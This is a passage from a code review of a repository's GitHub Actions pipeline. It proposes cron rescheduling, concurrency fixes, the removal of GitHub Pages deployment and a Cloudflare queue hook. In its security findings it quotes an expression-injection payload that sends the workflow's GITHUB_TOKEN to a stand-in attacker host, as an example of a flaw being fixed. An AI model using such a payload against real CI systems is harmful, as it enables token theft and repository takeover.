7. **No `timeout-minutes` on any heavy job**, so a hang holds `data-write` for the 6-hour default.

### 4.2 Proposed timetable

Design rules: (a) every minute value is off `:00` and off `:30`; (b) three *dedicated, non-overlapping* heavy slots on disjoint hours; (c) all short jobs in one early "light block" that always finishes before the first heavy slot; (d) dependent jobs ordered so the snapshot reads the freshest data; (e) minimum inter-job gap ≥ 45 min to absorb GitHub scheduling delay and a 2× runtime regression.

| UTC | Days | Workflow | Cron | Dur | Ends |
|---|---|---|---|---|---|
| **Light block** | | | | | |
| 01:17 | daily | Auto Update JSON Data | `17 1 * * *` | ~1 m | 01:18 |
| ~01:18 | daily | → Generate Markdown Tables (`workflow_run`) | — | ~1 m | 01:19 |
| 02:23 | Sun/Wed/Fri | Top Online Leaderboard | `23 2 * * 0,3,5` | 21 m | 02:44 |
| 03:13 | Mon/Thu | Mark Dead Games (→ dispatches Tables) | `13 3 * * 1,4` | ~1 m | 03:15 |
| 03:37 | Sun | Anti-Cheat List | `37 3 * * 0` | ~1 m | 03:38 |
| 03:53 | 2nd, 16th | Top Offline Leaderboard | `53 3 2,16 * *` | 17 m | 04:10 |
| 04:20 | daily | Daily Snapshot | `20 4 * * *` | ~1 m | 04:21 |
| **Heavy slot A** | | | | | |
| 05:11 | Tue/Thu/Sat | Update Reviews | `11 5 * * 2,4,6` | 115 m | 07:06 |
| **Heavy slot B** | | | | | |
| 08:11 | Wed | Purge Unhealthy Games | `11 8 * * 3` | 115 m | 10:06 |
| **Heavy slot C** | | | | | |
| 12:11 | 8th, 18th, 28th | Check Dead Links | `11 12 8,18,28 * *` | 116 m | 14:07 |
| **Non-writers** | | | | | |
| 14:41 | Mon | CodeQL | `41 14 * * 1` | ~1 m | own group |
| 16:09 | daily | Pipeline Health (§2.3) | `9 16 * * *` | ~1 m | own group |

**Collision proof.** Heavy slots occupy disjoint hour ranges (05:11–07:06 / 08:11–10:06 / 12:11–14:07) and cannot overlap regardless of which weekday a date falls on. The light block's worst case is the 2nd or 16th falling on a Sunday: 01:17, 02:23–02:44, 03:37, 03:53–04:10, 04:20 → done 04:21, which is 50 min before the earliest heavy slot; Sunday is not in `2,4,6` so slot A does not even run. Worst real gap is **Saturday the 2nd**: snapshot ends 04:21, Update Reviews starts 05:11 → **51 minutes of slack.**

**Ordering rationale.** Snapshot moves from 23:00 to 04:20 so it runs *last in the light block*, after Auto Update, Top Online, Top Offline, Mark Dead Games and Anti-Cheat have all landed. It then captures the freshest player counts of the day at a stable UTC hour, which is what a time series needs.

**Cadence changes and their justification.**

| Workflow | Before | After | Why |
|---|---|---|---|
| Update Reviews | `0 6 */2 * *` = 15–16 ×/mo, incl. a 31st→1st back-to-back | Tue/Thu/Sat = ~13 ×/mo | Removes the day-of-month wraparound; deterministic weekday slot; Steam review percentages move far slower than 36 h. |
| Check Dead Links | every 5 days = 6 ×/mo | 8/18/28 = 3 ×/mo | 116 min × 6 is the single largest consumer for the least volatile signal; a store page that 404s today still 404s in 10 days, and `mark-dead-games` covers the fast-moving "zero players" case twice a week. |
| Purge Unhealthy | Mon 05:00 | Wed 08:11 | Moved purely to own a clean heavy slot; weekly cadence unchanged. |
| Top Offline | 1st & 15th | 2nd & 16th | Shifted one day so month-boundary crons don't cluster with the 1st-of-month wave. |
| Daily Snapshot | 23:00 | 04:20 | Correct ordering (above). |
| Everything else | — | unchanged cadence | Only the clock minute moved. |

Net runner-minutes: **~3,290 → ~2,720 per month** (−17%), with zero overlaps. (Public repo, so Actions minutes are free — this matters only if the repo is ever made private, but the congestion reduction is real either way.)

### 4.3 Concurrency hardening — required alongside the reschedule

**(a) Add the missing group to `snapshot-daily.yml`** (§7).

**(b) Add `timeout-minutes` to every writer** so a hang cannot hold `data-write` for 6 hours:

| Workflow | `timeout-minutes` |
|---|---|
| Update Reviews / Check Dead Links / Purge Unhealthy | `180` |
| Top Online / Top Offline | `45` |
| Auto Update JSON / Generate Tables / Anti-Cheat / Mark Dead / Snapshot | `15` |
| Ingest New / Ingest from Issue | `20` |
| Bot Ingest | `30` (already at `bot-ingest.yml:36`) |
| Force Re-fetch All | `120` (already at `refetch-all.yml:26`) |

**(c) Make evictions visible** — §2.4's widened conclusion filter plus the `cancelled`/`timed_out` scan in `pipeline-health.yml`.

**(d) Rebase before push.** The concurrency group serializes *Actions*, but `web/src/lib/edits.ts` → `lib/git-data.ts` commits straight to the repo with the owner's browser PAT and knows nothing about it. Today that race produces a rejected non-fast-forward push and a red run. Harden the tail of every `bash/*.sh`:

```bash
# replace the trailing `git push` in every bash/*.sh
BR="${GITHUB_REF_NAME:-main}"
for attempt in 1 2 3; do
  if git push origin "HEAD:$BR"; then exit 0; fi
  echo "push rejected (attempt $attempt) — rebasing onto origin/$BR"
  git fetch origin "$BR"
  git pull --rebase --autostash origin "$BR" || {
    echo "::error::rebase conflict on data shards — re-run this workflow"; exit 1; }
  sleep $((attempt * 5))
done
echo "::error::push failed after 3 attempts"; exit 1
```

Honest limitation: this fixes *disjoint* races (a `games/*.md` write vs. a `data/` write). If both sides rewrote the same shard, `save_main()` produces a genuine conflict and the job **should** fail loudly rather than silently pick a winner — hence the explicit `::error::` and exit rather than `-X ours`.

**(e) The event-driven writers** (`ingest-new`, `ingest-from-issue`, `bot-ingest`) can fire at any moment and will queue behind a 115-minute heavy job. Keep them in `data-write` — the alternative (a separate group) allows two processes to rewrite the same shards, which is worse. Document the ~2 h worst-case latency in `docs/`, and note that (d) makes even a bypass non-destructive.

---

## 5. The two real bugs

### 5.1 `bot-ingest.yml:194-202` — delete the step

```yaml
      -
        name : Edit Telegram message with run URL
        if : always()
        run : |
          curl -sS -X POST "https://api.telegram.org/bot${{ secrets.BOT_TOKEN }}/editMessageText" \
            -d chat_id=${{ inputs.chat_id }} \
            -d message_id=${{ inputs.message_id }} \
            --data-urlencode "text=$(cat result.txt)
          🔗 https://github.com/${{ github.repository }}/actions/runs/${{ github.run_id }}"
```

Five defects:

1. **Wrong secret.** `secrets.BOT_TOKEN` — the rest of the file uses `TELEGRAM_BOT_TOKEN` (`:6`, `:121`, `:166`). This is *not* a missing-secret error: `gh secret list` shows **both** exist (`BOT_TOKEN` and `TELEGRAM_BOT_TOKEN`, both created 2026-05-09). So the step may be authenticating as a stale duplicate token — worse than failing loudly.
2. **`cat result.txt` reads a file no step creates.** Grepping the file, the only artefacts written are `/tmp/ingest.log` (`:80`) and `$GITHUB_OUTPUT` (`:93-98`, `:109`, `:114`). `cat` writes to stderr and the substitution yields empty; `curl` then POSTs an empty `text=`, which Telegram rejects with HTTP 400 — and `curl -sS` still exits 0, so the step goes **green while doing nothing**.
3. **`if: always()`** means it runs *after* the success notifier (`:118`) and *after* the failure notifier (`:163`), editing the same Telegram message a third time and clobbering the useful summary with an empty one.
4. **Command-line secret interpolation.** `${{ secrets.BOT_TOKEN }}` is substituted into the shell command text before execution — it lands in the process argv, visible to any concurrent process, and it defeats the log-masking that `env:`-passed secrets get. Every other step in this file does it correctly via `env:` (`:120-126`, `:165-169`).
5. **Expression injection.** `${{ inputs.chat_id }}` and `${{ inputs.message_id }}` are unquoted `workflow_dispatch` inputs pasted into a `run:` block. Anyone who can dispatch this workflow controls that string; `chat_id=$(curl attacker.example/$GITHUB_TOKEN)` executes. `contents: write` is in scope. This is the highest-severity item in the whole review.

**Fix — delete lines 194 to 202 entirely.** The step is redundant: `:117-160` (success) and `:162-192` (failure) already edit the Telegram message and already include the run URL (`:126`, `:169`, `:142`, `:176`). Then `gh secret delete BOT_TOKEN`.

If a run-URL line is genuinely wanted on *every* outcome, fold it into a single always-step built on the same env-passing pattern the file already uses:

```yaml
      -
        name : Notify Telegram
        if : always()
        env :
          TELEGRAM_BOT_TOKEN : ${{ secrets.TELEGRAM_BOT_TOKEN }}
          CHAT_ID   : ${{ inputs.chat_id }}
          MSG_ID    : ${{ inputs.message_id }}
          SUMMARY   : ${{ steps.ingest.outputs.summary }}
          COMMITTED : ${{ steps.commit.outputs.committed }}
          OUTCOME   : ${{ job.status }}
          RUN_URL   : ${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }}
        run : |
          python <<'PY'
          import os, urllib.parse, urllib.request

          outcome   = os.environ.get("OUTCOME", "failure")
          ok        = outcome == "success"
          committed = os.environ.get("COMMITTED") == "true"
          summary   = os.environ.get("SUMMARY") or "(no summary line)"
          run_url   = os.environ["RUN_URL"]

          if not ok:
              text = f"❌ *Steam ingest failed*\n\n[View workflow run]({run_url})"
          else:
              icon = "✅" if committed else "ℹ️"
              tail = "Committed to repo." if committed else "No changes (all duplicates / network errors)."
              text = (f"{icon} *Steam ingest done*\n\n```\n{summary}\n```\n"
                      f"{tail}\n\n[View workflow run]({run_url})")

          payload = urllib.parse.urlencode({
              "chat_id":    os.environ["CHAT_ID"],
              "message_id": os.environ["MSG_ID"],
              "parse_mode": "Markdown",
              "text":       text,
          }).encode()
          url = f"https://api.telegram.org/bot{os.environ['TELEGRAM_BOT_TOKEN']}/editMessageText"
          try:
              with urllib.request.urlopen(urllib.request.Request(url, data=payload), timeout=30) as r:
                  print(f"Telegram callback: HTTP {r.status}")
          except Exception as e:
              print(f"::warning::Telegram callback failed: {e}")   # never fail the ingest
          PY
```

That single step replaces `:117-160`, `:162-192` **and** `:194-202`. Secrets and inputs all arrive through `env:`, so nothing is interpolated into a command line.

While in this file: `:1` names the wrong repo (`steam-f2p-tracker`, actual is `free-steam-games-list`); `:49` `pip install --quiet requests` → `-r requirements.txt`; `:106` `git add data/ scripts/temp_info.jsonl scripts/removed_games.jsonl 2>/dev/null || true` swallows real failures — drop the `|| true` and let a missing path be an explicit `git add -A -- data/ scripts/`; `:113` `git push` needs the retry from §4.3(d).

### 5.2 `ingest-from-issue.yml:39` — the unparenthesised chain

```yaml
          git diff --staged --quiet && echo "No changes" || git commit -m "Ingest #${{ github.event.issue.number }}" && git push
```

Bash `&&` and `||` share precedence and associate left-to-right, so this parses as `((A && B) || C) && D`:

| A (`git diff --staged --quiet`) | Path taken | `git push` runs? |
|---|---|---|
| **true** (nothing staged) | B `echo` runs → left side true → `||` short-circuits, C skipped → `&&` sees true | **yes — pushes nothing** |
| **false** (changes staged) | B skipped → C `git commit` runs → if it succeeds, `&&` sees true | yes (correct) |

The no-changes push is not merely cosmetic: if the remote has moved (a `data-write` job or an SPA write landed meanwhile), the no-op `git push` is rejected non-fast-forward, the step exits non-zero, the run goes red — and the very next step (`:41-51`) is skipped, so the issue is never commented on or closed. **The user-visible symptom is a stuck issue on a run where nothing was actually wrong.** Every `bash/*.sh` parenthesises this correctly (e.g. `bash/json.sh:7`); this file is the outlier.

**Corrected YAML** — replacing lines 34-39:

```yaml
      -
        name : Commit and push
        env :
          ISSUE_NUMBER : ${{ github.event.issue.number }}
        run : |
          set -euo pipefail
          git config user.name  'github-actions[bot]'
          git config user.email '41898282+github-actions[bot]@users.noreply.github.com'
          git add -A -- data/ games/ scripts/
          if git diff --staged --quiet; then
            echo "No changes to commit."
            exit 0
          fi
          git commit -m "Ingest from issue #${ISSUE_NUMBER}"
          BR="${GITHUB_REF_NAME:-main}"
          for attempt in 1 2 3; do
            if git push origin "HEAD:$BR"; then exit 0; fi
            git fetch origin "$BR"
            git pull --rebase --autostash origin "$BR" || {
              echo "::error::rebase conflict on data shards — re-run this workflow"; exit 1; }
            sleep $((attempt * 5))
          done
          echo "::error::push failed after 3 attempts"; exit 1
```

`if`/`else` instead of `&&`/`||`, `set -euo pipefail` (this workflow is the only writer without it — every `bash/*.sh` has it at line 2), the issue number moved out of the interpolated string into `env:`, `git add` scoped to the three real output directories instead of `git add .`, and the §4.3(d) retry.

**Bonus, same file, higher severity than the chain bug:** `:10` is `if : contains(github.event.issue.title, '[add-game]')` with no author check. On a public repo **any** user can open an issue titled `[add-game]`, and `:22-27` writes their fenced JSON block verbatim into `scripts/temp_info.jsonl`, which `:29-33` feeds to `ingest_new.py` and `:34-39` commits and pushes — with `contents: write` and `issues: write`. Blast radius is limited (`ingest_new.py` reads only `link` and validates via `normalize_link`), but it is an unauthenticated write path into the default branch. Gate it:

```yaml
    if : >-
      contains(github.event.issue.title, '[add-game]') &&
      contains(fromJSON('["OWNER","MEMBER","COLLABORATOR"]'), github.event.issue.author_association)
```

Anyone else gets an auto-comment pointing at `/add` in the SPA, or the maintainer applies a label to re-trigger. (The Cloudflare admin area of decision #3 is arguably the right long-term home for this whole path — issue-driven ingest becomes redundant once the D1 queue exists.)

---

## 6. Deleting `deploy-pages.yml` and everything downstream

| # | Artifact | Action | Detail |
|---|---|---|---|
| 1 | `.github/workflows/deploy-pages.yml` | **Delete** (58 lines) | Removes the `pages: write` / `id-token: write` permissions (`:14-15`), the `concurrency: group: pages` (`:17-19`), and the `github-pages` environment reference (`:53-55`). |
| 2 | `actions/upload-pages-artifact@v4` (`:46`), `actions/deploy-pages@v5` (`:58`) | **Gone by consequence** | Two fewer actions to pin/maintain. |
| 3 | `.github/workflows/notify-deploy.yml` | **Delete** (18 lines) | Its `workflows: ["Deploy Web (GitHub Pages)"]` (`:7`) can never match again. Replace with a **Cloudflare notification** (Zero Trust/Notifications → *Workers Build* events → the existing `DISCORD_CI_WEBHOOK`), since Workers Builds deploys are invisible to GitHub Actions. |
| 4 | `poli0981/.github/.github/workflows/notify-deploy.yml@main` | **Leave in place** | Out of this repo; sibling repos may still call it. Just stop calling it from here. |
| 5 | Repo Settings → Pages | **Set Source to None** | `gh api .../pages` currently shows `build_type: workflow`, `status: null`, `cname: null`. |
| 6 | Settings → Environments → `github-pages` | **Delete** | Otherwise it lingers with deployment history and a protection rule nothing uses. |
| 7 | The live Pages site | **Keep until DNS is verified** | The brief notes `free-steam-games.win` does **not** currently resolve. Order: (i) Cloudflare Worker live and serving on the new domain, (ii) verify from an outside network, (iii) *then* disable Pages. Optionally leave `poli0981.github.io/free-steam-games-list/` up for a grace period serving a one-line meta-refresh to the new domain. |
| 8 | `web/public/404.html` | **Delete** (44 lines) | Obsolete twice over: `not_found_handling: "single-page-application"` in `wrangler.jsonc` returns `index.html` with 200 for unmatched paths, so the file is never consulted; and `:33-34` hardcode `/free-steam-games-list/#/`, which is wrong on both counts after `base: '/'` + BrowserRouter. The `*` route in `web/src/App.tsx` renders NotFound. Its own comment (`:10-13`) confirms it exists purely for GitHub Pages. |
| 9 | `web/vite.config.ts:68` `globIgnores: ["404.html"]` | **Remove** | Dangling reference once #8 is deleted. |
| 10 | `web/vite.config.ts:69` `navigateFallback` | **Rewrite** | `command === "build" ? \`/${repoName}/index.html\` : "/index.html"` → `"/index.html"` unconditionally. |
| 11 | `web/vite.config.ts:16` `base` | **Rewrite** | `command === "build" ? \`/${repoName}/\` : "/"` → `"/"`. This also makes `build:desktop` / `build:mobile` (`web/package.json`, `--base /`) redundant — collapse all three to `npm run build`. |
| 12 | `web/public/robots.txt:4` | **Rewrite** | `Sitemap: https://poli0981.github.io/free-steam-games-list/sitemap.xml` → `https://free-steam-games.win/sitemap.xml`. |
| 13 | `web/public/sitemap.xml` | **Regenerate** | Entry 1 `<loc>https://poli0981.github.io/free-steam-games-list/</loc>` → `https://free-steam-games.win/`. Entries 2-5 are `github.com/...` blob URLs — **cross-domain sitemap entries are ignored** unless you own the domain in Search Console, so they are dead weight; replace with the SPA's real routes (`/games`, `/top-online`, `/charts/*`, `/about`, …). |
| 14 | `web/index.html` | **Rewrite** | canonical, `og:url`, JSON-LD `url` all point at the Pages URL. Also `lang="vi"` hardcoded and "1,200+ games" stale (actual 3,424). |
| 15 | `.github/workflows/release-desktop.yml:84` | **Rewrite** | Release body advertises `https://poli0981.github.io/free-steam-games-list/`. |
| 16 | `.github/workflows/release-android.yml:122-123` | **Rewrite** | Same URL in the APK release notes. |
| 17 | `web/src-tauri/tauri.conf.json` | **Coordinate with the Tauri agent** | Adding a CSP (currently `security.csp: null`) means the new origin — and `free-steam-games.win`, `raw.githubusercontent.com`, `*.steamstatic.com` — must be in `connect-src`/`img-src`. Flagged, not designed here. |
| 18 | `README.md`, `docs/*`, `CHANGELOG.md` | **Coordinate with the docs agent** | All carry the Pages URL. |

### 6.1 Net-new requirement: replace the typecheck gate

`deploy-pages.yml:39-43` was the only thing running `npm run typecheck` and `npm run build` in CI. `npm run build` is `tsc -b && vite build` (`web/package.json`), so Cloudflare's build *will* catch type errors — **but only on a push to the watched branch, after merge, and the failure surfaces in the Cloudflare dashboard rather than on the PR.** Add a pure-CI workflow (no deploy):

```yaml
# .github/workflows/web-ci.yml  (NEW)
name: Web CI

on:
  pull_request:
    paths: ['web/**', '.github/workflows/web-ci.yml']
  push:
    branches: [main]
    paths: ['web/**', '.github/workflows/web-ci.yml']
  workflow_dispatch:

permissions:
  contents: read

concurrency:
  group: web-ci-${{ github.ref }}
  cancel-in-progress: ${{ github.event_name == 'pull_request' }}

jobs:
  check:
    runs-on: ubuntu-latest
    timeout-minutes: 20
    defaults:
      run:
        working-directory: web
    steps:
      - uses: actions/checkout@d23441a48e516b6c34aea4fa41551a30e30af803 # v6.0.3
        with:
          persist-credentials: false

      - uses: actions/setup-node@a0853c24544627f65ddf259abe73b1d18a591444 # v5.0.0
        with:
          node-version: '24'
          cache: 'npm'
          cache-dependency-path: web/package-lock.json

      - run: npm ci        # NOT `npm ci || npm install` — see note
      - run: npm run typecheck
      - run: npm run build
```

Note on `npm ci || npm install`: that fallback appears at `deploy-pages.yml:37`, `release-desktop.yml:65` and `release-android.yml:74`. It silently papers over a `package.json`/`package-lock.json` mismatch — **which is exactly the state the repo is in today** (`echarts` locked at 5.6.0 while `package.json` declares `^6.1.0`). Drop the fallback in all three places so the lockfile drift fails loudly instead of resolving to a different dependency tree than anyone reviewed.

---

## 7. Committing the snapshot feature properly

### 7.1 `.github/workflows/snapshot-daily.yml` — full replacement

Current (14 lines) is missing the concurrency group, is on the oldest action majors, uses the dead PAT, and has no timeout.

```yaml
name: Daily Snapshot

# Captures one time-series row per game into data/snapshots/YYYY-MM-DD.jsonl.gz.
# Scheduled LAST in the light block (04:20 UTC) so it reads the freshest data of
# the day: after Auto Update JSON (01:17), Top Online (02:23), Mark Dead Games
# (03:13), Anti-Cheat (03:37) and Top Offline (03:53) have all landed.

on:
  schedule: [{ cron: '20 4 * * *' }]
  workflow_dispatch:

permissions:
  contents: write

# REQUIRED — snapshot.py reads the same shards every other writer rewrites, and
# bash/snapshot.sh pushes. Without this group it can race a 115-minute writer.
concurrency:
  group: data-write
  cancel-in-progress: false

jobs:
  snapshot:
    runs-on: ubuntu-latest
    timeout-minutes: 15
    steps:
      - uses: ./.github/actions/py-data-job
        with:
          script: ./bash/snapshot.sh
```

Changes vs. the untracked file: `concurrency: {group: data-write, cancel-in-progress: false}` **added** (the whole point); `actions/checkout@v4` `:10` → the composite's SHA-pinned v6; `actions/setup-python@v5` `:12` → SHA-pinned v6; `python-version: '3.12'` `:13` → `.python-version` (3.14); `token: '${{ secrets.GH_TOKEN }}'` `:11` → **removed** (GITHUB_TOKEN + `permissions: contents: write`); cron `0 23 * * *` → `20 4 * * *`; `timeout-minutes: 15` added.

Also add `"Daily Snapshot"` to `notify-ci-failure.yml`'s workflow list (§2.4) — it is currently monitored by nothing.

### 7.2 `bash/snapshot.sh` — yes, drop the `requests` install

**Verified vestigial.** `scripts/snapshot.py` imports `json os re sys datetime pathlib` + `core.data_store`; `scripts/core/data_store.py` imports `glob json os re datetime typing` + `.constants`; `scripts/core/constants.py` imports **only `os`**. Nothing in that chain touches the network. `pip install --quiet requests` at `bash/snapshot.sh:3` costs ~8-10 s and adds a PyPI outage as a failure mode for a job that never makes an HTTP request.

But do not fix it locally — **remove `pip install` from all eleven `bash/*.sh` and hoist it into the composite action of §3.2**, which installs `-r requirements.txt`. That kills three birds: the vestigial install disappears, the pin-ignoring `pip install requests` disappears everywhere, and `bash/*.sh` become runnable in a local venv without mutating it.

Resulting script:

```bash
#!/bin/bash
set -euo pipefail
python scripts/snapshot.py
git config --global user.name  'github-actions[bot]'
git config --global user.email '41898282+github-actions[bot]@users.noreply.github.com'
git add data/snapshots/
if git diff --staged --quiet; then
  echo "No changes"
  exit 0
fi
git commit -m "Snapshot [$(date -u +'%Y-%m-%d')]"
# …§4.3(d) push-with-rebase retry…
```

`git add data/snapshots/` (`:6`) is already correctly scoped — better than the `git add .` in every sibling script; keep it. Note `date +'%Y-%m-%d'` at `:6` uses the runner's local time while `snapshot.py:46` uses `datetime.now(timezone.utc)`; add `-u` so the commit message and the filename can never disagree across a midnight boundary.

### 7.3 The repo-growth problem — decide before the first commit

`data/snapshots/2026-04-28.jsonl` is **237,504 bytes for 1,225 rows** (~194 B/row). At the current 3,424 games that is **≈ 664 KB/day → ≈ 242 MB/year**, permanently, in every clone and every CI checkout. This must be settled *before* the first daily run, because Git history cannot be trimmed afterwards without a rewrite.

| Option | Year-1 size | Notes |
|---|---|---|
| **A. gzip per day** — `snapshot.py` writes `.jsonl.gz`; add `*.jsonl.gz binary` / `-diff` to `.gitattributes` | ~20-25 MB | Smallest change. JSONL of repeated keys compresses ~10-12×. Recommended **minimum**. |
| **B. A + 90-day retention** — a prune step deletes dailies older than 90 days, after a monthly rollup `data/snapshots/monthly/YYYY-MM.jsonl.gz` (e.g. per-appid min/max/mean) is written | ~8 MB steady-state | Recommended. Charts need long-range trends at monthly granularity, not per-day. |
| **C. Snapshots go to D1/R2 instead of Git** | ~0 in Git | Cleanest given decision #3 already introduces D1. But it breaks the "Git is canonical" invariant for this one dataset, and D1's free tier is 100 K row writes/day — 3,424/day fits easily, and 5 GB storage holds years. Worth raising with the Cloudflare agent as the *long-term* answer. |

**Recommend B now, with C as the migration target.** Either way, `.gitattributes` needs `data/snapshots/** -diff` so PR diffs and `git log -p` don't try to render them.

Also flag a data-quality caveat for whoever owns the schema: `current_players` is only refreshed by `top_online.py` (Sun/Wed/Fri), so a daily snapshot repeats the same number for up to 2 days with a fresh `captured_at`. Either record a `players_as_of` field sourced from the record's `last_updated`, or accept and document the staircase in the charts.

---

## 8. The daily new-games → D1 queue hook

### 8.1 Where "new games" come from

There is no auto-discovery in the pipeline — new games enter only via `scripts/temp_info.jsonl` (SPA `/add`, the Telegram bot, or an issue). The canonical marker is `added_at`, set once by `data_store.make_skeleton()` (`scripts/core/data_store.py:233`, `rec["added_at"] = now_iso()`), never overwritten. So:

> **new games = records whose `added_at` is within the last N hours.**

That definition is idempotent, needs no extra state file, and is derivable from a plain read of `data/*.jsonl` — which is exactly what makes both the push and the pull path below trivially safe.

### 8.2 Architecture: push for latency, pull for correctness

Decision #3 says Git stays canonical. Therefore **the D1 queue must never be a write-dependency of the data commit.** Two paths:

- **Push (fast path):** after a successful commit+push, the workflow POSTs the new appids to the Worker. Retries 3×; on final failure it emits a `::warning::` and a step summary but **does not fail the job**.
- **Pull (authoritative path):** a Worker Cron Trigger (hourly) fetches `data/index.json` + shards, selects `added_at >= now - 36h`, and upserts anything missing from `queue_new_games`. This closes every gap the push can leave — a dropped POST, an expired service token, a Cloudflare incident — without a human noticing.

The push is a latency optimization; the pull is the contract. Say so in the code comments so nobody later "fixes" the workflow by making the POST failure fatal.

### 8.3 Authentication: a Cloudflare Access service token

Since Cloudflare Access is already protecting `/admin`, use the **same** system rather than inventing a second one. In Zero Trust → Access → Service Auth, create a service token `github-actions-pipeline`. Add an Access application on `free-steam-games.win/api/admin/queue/*` with a **Service Auth** policy including that token (Access apps are deny-by-default and the most-specific path wins, so this sits beside — not inside — the interactive `/admin` policy).

Repo secrets:

| Secret | Value | Rotation |
|---|---|---|
| `CF_ACCESS_CLIENT_ID` | the service token's Client ID (`<id>.access`) | Cloudflare service tokens default to a **1-year expiry** — put the renewal date in the canary (§2.3) so this cannot become the next GH_TOKEN. |
| `CF_ACCESS_CLIENT_SECRET` | the service token's Client Secret | same |

The Worker must additionally verify the identity itself (validate the `Cf-Access-Jwt-Assertion` against the team's JWKS, or check the `common name` claim), so a leaked route alone is not enough — Access-in-front is necessary, not sufficient.

**Do not use a bare bearer/HMAC on an unprotected route** unless Access proves unworkable; a second auth system is a second thing to forget to rotate.

### 8.4 The workflow step

Add to the `py-data-job` composite as an optional trailing step, enabled by an input, so it runs identically from `ingest-new.yml`, `bot-ingest.yml`, `ingest-from-issue.yml` and the daily `update-json.yml`:

```yaml
      - name: Publish new games to the admin queue
        # Runs ONLY after the commit succeeded. The Git commit is canonical
        # (data/*.jsonl in this repo); D1 is a derived read-model for the
        # admin UI. A failure here must NEVER fail the data job — the Worker's
        # hourly cron reconciles from raw.githubusercontent regardless.
        if: success()
        continue-on-error: false      # we handle failure inline; see the `|| :` below
        env:
          CF_ACCESS_CLIENT_ID:     ${{ secrets.CF_ACCESS_CLIENT_ID }}
          CF_ACCESS_CLIENT_SECRET: ${{ secrets.CF_ACCESS_CLIENT_SECRET }}
          QUEUE_ENDPOINT: https://free-steam-games.win/api/admin/queue/ingest
          WINDOW_HOURS: '36'          # > the 24 h cadence, so a skipped day self-heals
          RUN_ID:  ${{ github.run_id }}
          COMMIT:  ${{ github.sha }}
        run: |
          set -uo pipefail            # deliberately NOT -e

          if [ -z "${CF_ACCESS_CLIENT_ID}" ] || [ -z "${CF_ACCESS_CLIENT_SECRET}" ]; then
            echo "::warning::Cloudflare service token not configured — skipping queue publish."
            echo "> ⚠️ queue publish skipped (no CF service token)" >> "$GITHUB_STEP_SUMMARY"
            exit 0
          fi

          # Emits {"run_id":…,"commit":…,"games":[{appid,name,link,genre,added_at},…]}
          # or exits 3 when there is nothing new.
          python scripts/export_new_games.py --hours "${WINDOW_HOURS}" > "${RUNNER_TEMP}/new.json"
          rc=$?
          if [ "$rc" = "3" ]; then
            echo "No new games in the last ${WINDOW_HOURS}h — nothing to publish."
            exit 0
          elif [ "$rc" != "0" ]; then
            echo "::warning::export_new_games.py exited $rc — queue publish skipped."
            exit 0
          fi

          count=$(python -c "import json,sys;print(len(json.load(open(sys.argv[1]))['games']))" "${RUNNER_TEMP}/new.json")
          echo "Publishing ${count} new game(s) to the admin queue."

          for attempt in 1 2 3; do
            code=$(curl -sS -o "${RUNNER_TEMP}/resp.txt" -w '%{http_code}' \
                     --max-time 30 \
                     -X POST "${QUEUE_ENDPOINT}" \
                     -H 'Content-Type: application/json' \
                     -H "CF-Access-Client-Id: ${CF_ACCESS_CLIENT_ID}" \
                     -H "CF-Access-Client-Secret: ${CF_ACCESS_CLIENT_SECRET}" \
                     -H "X-Pipeline-Run: ${RUN_ID}" \
                     -H "X-Pipeline-Commit: ${COMMIT}" \
                     --data-binary "@${RUNNER_TEMP}/new.json") || code=000
            case "$code" in
              2??) echo "queue publish OK (HTTP $code, ${count} games)"
                   echo "> ✅ queued ${count} new game(s)" >> "$GITHUB_STEP_SUMMARY"
                   exit 0 ;;
              4??) echo "::warning::queue publish rejected with HTTP $code — not retrying."
                   sed -n '1,20p' "${RUNNER_TEMP}/resp.txt"
                   break ;;
              *)   echo "queue publish attempt ${attempt} failed (HTTP $code); retrying"
                   sleep $(( attempt * attempt * 4 )) ;;   # 4s, 16s, 36s
            esac
          done

          echo "::warning::queue publish failed after retries — the Worker's hourly reconcile will pick these up."
          echo "> ⚠️ queue publish failed (HTTP ${code}); reconcile will cover it" >> "$GITHUB_STEP_SUMMARY"
          exit 0     # never fail the data job
```

Secrets arrive via `env:` and reach `curl` through `-H "…: ${VAR}"`, so they are never interpolated into the command text — the mistake §5.1 catalogues.

### 8.5 `scripts/export_new_games.py` (new, read-only)

```
--hours N   select records with added_at >= now_utc - N hours
--limit M   cap at M (default 500); if exceeded, emit the M oldest and warn
exit 0      JSON written to stdout
exit 3      nothing new (distinct from an error)
exit 1      unreadable data
```

Payload fields — **public game metadata only**. Never the Steam key, never a token, never anything from `MANUAL_FIELDS` that the admin is about to set:

```json
{
  "run_id": "18…", "commit": "dd6532ea…", "generated_at": "2026-09-10T04:21:07Z",
  "games": [
    { "appid": "2050650", "name": "…", "link": "https://store.steampowered.com/app/2050650/",
      "genre": "Action", "developer": ["…"], "release_date": "…",
      "header_image": "…", "added_at": "2026-09-10T01:18:02Z" }
  ]
}
```

### 8.6 Worker side (contract only — the Cloudflare agent owns the implementation)

- `POST /api/admin/queue/ingest` → for each game, `INSERT INTO queue_new_games (appid, payload_json, first_seen_at, source_run_id, source_commit, state) VALUES (…, 'pending') ON CONFLICT(appid) DO UPDATE SET payload_json = excluded.payload_json, last_seen_at = …` — **never** resetting `state` for a row already `approved`/`rejected`. Upsert-by-appid is what makes the workflow's retries and the cron reconciler mutually safe.
- Respond `200` with `{queued, updated, skipped}` and log a row to the audit table.
- Reject bodies > 1 MB and `games` arrays > 500 with `4xx` (the workflow deliberately does not retry `4xx`).
- `GET /api/admin/health` → `200` + `{ok:true, pending, newest_first_seen_at}`, used by the canary in §2.3.
- Cron Trigger, hourly: fetch `data/index.json` + shards, select `added_at >= now-36h`, run the same upsert. This is the path that makes the whole thing correct.

### 8.7 Which workflows carry the hook

| Workflow | Hook? | Why |
|---|---|---|
| `ingest-new.yml` | **Yes** | The primary path — SPA `/add` writes `temp_info.jsonl`, this ingests it. |
| `bot-ingest.yml` | **Yes** | Telegram path; also the noisiest, so latency matters. |
| `ingest-from-issue.yml` | **Yes** | Third ingest path. |
| `update-json.yml` | **Yes** | Daily safety net — a 36 h window catches anything the three above dropped. |
| `refetch-all.yml` | **No** | Rewrites existing records; `added_at` is preserved (`make_skeleton` only sets it on creation), so nothing new appears — but a 3,424-game payload would be produced if the window logic were ever wrong. Explicitly opt out. |
| Everything else | **No** | Never creates records. |

---

## 9. Suggested landing order

Five PRs, each independently verifiable. Do **not** combine 1 and 2.

